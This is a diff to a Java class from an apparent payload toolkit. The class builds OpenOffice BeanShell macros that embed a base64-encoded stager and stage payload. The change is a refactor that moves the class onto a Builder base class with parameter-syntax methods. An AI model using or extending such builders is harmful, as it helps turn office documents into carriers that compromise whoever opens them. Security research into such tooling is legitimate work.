@@ -39,17 +39,35 @@ import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.InputStream;
 
-public class BeanShellMacroBuilder {
+import javapayload.builder.EmbeddedClassBuilder.EmbeddedClassBuilderTemplate;
+
+public class BeanShellMacroBuilder extends Builder {
 	public static void main(String[] args) throws Exception {
 		if (args.length < 3) {
-			System.out.println("Usage: java javapayload.builder.BeanShellMacroBuilder <stager> [stageroptions] -- <stage> [stageoptions]");
+			System.out.println("Usage: java javapayload.builder.BeanShellMacroBuilder "+new BeanShellMacroBuilder().getParameterSyntax());
 			return;
 		}
+		new BeanShellMacroBuilder().build(args);
+	}
+	
+	public BeanShellMacroBuilder() {
+		super("Build a BeanShell Macro for OpenOffice.org", "");
+	}
+	
+	protected int getMinParameterCount() {
+		return 3;
+	}
+	
+	public String getParameterSyntax() {
+		return "<stager> [stageroptions] -- <stage> [stageoptions]";
+	}
+	
+	public void build(String[] args) throws Exception {
 		String[] builderArgs = new String[args.length+1];
 		System.arraycopy(args, 0, builderArgs, 1, args.length);
 		builderArgs[0] = "Tmp";
 		ByteArrayOutputStream baos = new ByteArrayOutputStream();
-		InputStream in = new ByteArrayInputStream(ClassBuilder.buildClassBytes(builderArgs[0], builderArgs[1], EmbeddedClassBuilder.class, EmbeddedClassBuilder.buildEmbeddedArgs(builderArgs), builderArgs));
+		InputStream in = new ByteArrayInputStream(ClassBuilder.buildClassBytes(builderArgs[0], builderArgs[1], EmbeddedClassBuilderTemplate.class, EmbeddedClassBuilder.buildEmbeddedArgs(builderArgs), builderArgs));
 		new sun.misc.BASE64Encoder().encode(in, baos);
 		in.close();
 		new File("Tmp.class").delete();
